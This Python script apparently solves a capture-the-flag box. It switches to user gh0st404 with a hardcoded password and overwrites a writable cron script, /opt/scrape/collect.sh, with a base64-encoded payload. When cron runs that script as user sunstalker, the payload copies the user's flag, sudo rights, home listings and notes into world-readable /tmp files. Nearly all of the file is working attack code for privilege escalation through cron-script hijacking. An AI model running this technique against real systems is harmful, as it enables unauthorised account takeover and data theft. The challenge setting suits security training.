"""Chain: svc-deploy -su-> gh0st404 -collect.sh(cron as sunstalker)-> flag + sudo -l."""
import asyncio
import base64
import os
import sys
import uuid

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import find_flags as ff  # noqa: E402
from find_flags import Shell  # noqa: E402

GHOST_PW = "Gh0stInTh3Sh3ll_404"

# Runs every minute AS sunstalker (cron.d/charon-collect). Dumps everything we
# need, chmods the output world-readable so gh0st404 can read it.
PAYLOAD = r"""#!/bin/sh
{
echo "=== cron-time: $(date) ==="
echo "=== as ==="; id
echo "=== sunstalker flag ==="; cat /home/sunstalker/flag.txt 2>&1
echo "=== sudo -l ==="; sudo -n -l 2>&1
echo "=== ls /home/sunstalker ==="; ls -la /home/sunstalker/ 2>&1
echo "=== ls /home ==="; ls -la /home/ 2>&1
echo "=== grep flags in readable homes ==="; grep -rI 'deadface{' /home 2>/dev/null
echo "=== notes ==="; cat /home/sunstalker/*.txt /home/sunstalker/.*.txt 2>/dev/null
} > /tmp/sunstalker_dump.txt 2>&1
chmod 666 /tmp/sunstalker_dump.txt
cp /home/sunstalker/flag.txt /tmp/sun_flag.txt 2>/dev/null
chmod 666 /tmp/sun_flag.txt 2>/dev/null
echo done > /tmp/collector_ran.txt
chmod 666 /tmp/collector_ran.txt
"""


def ff_clean(s):
    import re
    s = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", s)
    s = s.replace("\x1b[?2004l", "").replace("\x1b[?2004h", "")
    return s.strip()


async def wait_for(sh, needle, timeout=45.0):
    buf, loop = "", asyncio.get_event_loop()
    end = loop.time() + timeout
    while loop.time() < end:
        buf += await sh.read(1.5)
        if needle in buf:
            return True, buf
    return False, buf


async def cmd(sh, command, timeout=45.0):
    tag = "Z" + uuid.uuid4().hex[:7]
    await sh.send(command)
    await asyncio.sleep(0.3)
    await sh.send(f"echo {tag}D")
    ok, buf = await wait_for(sh, f"{tag}D", timeout)
    txt = "\n".join(l for l in buf.splitlines() if tag not in l)
    return ff_clean(txt), ok


async def su_to(sh, user, password):
    await sh.send(f"su - {user}")
    got, _ = await wait_for(sh, "Password:", 25.0)
    if not got:
        return False
    await sh.send(password)
    await asyncio.sleep(3.0)
    await sh.read(2.0)
    who, _ = await cmd(sh, "id", 25)
    return user in who


async def body(sh):
    await sh.read(5.0)
    print("start id:", (await cmd(sh, "id"))[0][:100], flush=True)

    print("\n### 0. recon: cron + scrape dir (as svc-deploy)", flush=True)
    print(await cmd(sh, "cat /etc/cron.d/charon-collect 2>&1; echo ---; ls -la /opt/scrape/ 2>&1", 20), flush=True)

    print("\n### 1. su gh0st404", flush=True)
    if not await su_to(sh, "gh0st404", GHOST_PW):
        print("[!] su gh0st404 failed", flush=True)
        return False
    print("now:", (await cmd(sh, "whoami; id"))[0], flush=True)

    print("\n### 2. inspect collect.sh as gh0st404", flush=True)
    print(await cmd(sh, "ls -la /opt/scrape/; echo ---; cat /opt/scrape/collect.sh", 20), flush=True)

    print("\n### 3. backup + plant payload", flush=True)
    _, ok1 = await cmd(sh, "cp /opt/scrape/collect.sh /tmp/collect.sh.orig && echo BACKEDUP", 15)
    print("backup:", ok1, flush=True)
    b64 = base64.b64encode(PAYLOAD.encode()).decode()
    _, ok2 = await cmd(sh, f"echo {b64} | base64 -d > /opt/scrape/collect.sh", 20)
    _, ok3 = await cmd(sh, "chmod 755 /opt/scrape/collect.sh && echo PLANTED", 15)
    print("planted:", ok2, ok3, flush=True)
    print("verify:", (await cmd(sh, "cat /opt/scrape/collect.sh", 15))[0][:400], flush=True)

    print("\n### 3b. does bash even exist?", flush=True)
    print(await cmd(sh, "ls -la /bin/bash /bin/sh 2>&1; echo ---; ls -la /tmp/ 2>&1", 15), flush=True)

    print("\n### 4. wait for cron (runs as sunstalker every minute)", flush=True)
    got = False
    for i in range(14):
        await asyncio.sleep(10)
        out, ok = await cmd(sh, "cat /tmp/sunstalker_dump.txt 2>/dev/null; echo scan_done", 30)
        # the pty echoes our command back - strip it, then look for the
        # marker that ONLY appears inside the dump file, never in the echo
        if "cron-time:" in out:
            got = True
            print(f"\n[cron fired after ~{(i+1)*10}s]", flush=True)
            print(out, flush=True)
            break
        print(f"  ...waiting ({(i+1)*10}s)", flush=True)
    if not got:
        print("[!] cron never fired - check /tmp/collector_ran.txt manually", flush=True)
        print(await cmd(sh, "ls -la /tmp/; cat /tmp/collector_ran.txt 2>&1", 15), flush=True)
    return got


async def main():
    for attempt in range(1, 5):
        try:
            async with Shell() as sh:
                if await body(sh):
                    return
                return
        except Exception as e:
            import traceback
            print(f"[outer {attempt}] {type(e).__name__}: {e}", flush=True)
        await asyncio.sleep(6)
    print("[!] exhausted retries", flush=True)


asyncio.run(main())
